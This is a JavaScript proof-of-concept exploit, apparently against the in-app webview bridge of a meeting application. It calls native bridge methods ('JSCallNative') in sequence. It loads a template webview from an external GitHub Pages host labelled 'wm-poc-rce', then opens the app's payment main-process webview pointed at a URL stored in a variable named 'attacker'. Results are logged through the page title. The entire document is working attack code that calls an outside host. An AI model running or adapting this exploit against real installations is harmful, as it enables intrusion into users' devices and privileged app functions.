(function(){
  document.title='P82TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        module:'CommonPlugin',method:'PrintLog',
        param:{log:JSON.stringify(r)},callId:'LOG'
      }));
    }catch(e){}
    document.title='P82CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p',module:mod,method:m,param:p,callId:id
    }));
  }
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var attacker='https://gitwhs.github.io/wm-poc-rce/p82atk.html';
  var tpl='https://gitwhs.github.io/wm-poc-rce/p82tpl.html';
  var payMain='wemeet://page/pay/main_process_webview';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['T1','CommonPlugin','LoadTemplateWebView',{url:tpl,template_url:tpl,template_id:'p82'}],
    ['T3','CommonPlugin','TemplateWebViewIsExist',{url:tpl,template_url:tpl}],
    ['T4','CommonPlugin','GetWebCacheInitStatus',{}],
    ['O6','CommonPlugin','OpenNewPage',{scheme:payMain,router_params:{url:attacker,from_webView:true}}],
    ['H3','CommonPlugin','GetPerformance',{}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P82TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P82-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    var wait=x[0]==='T1'?8000:4000;
    setTimeout(n, wait);
  }
  setTimeout(n, 1500);
})();
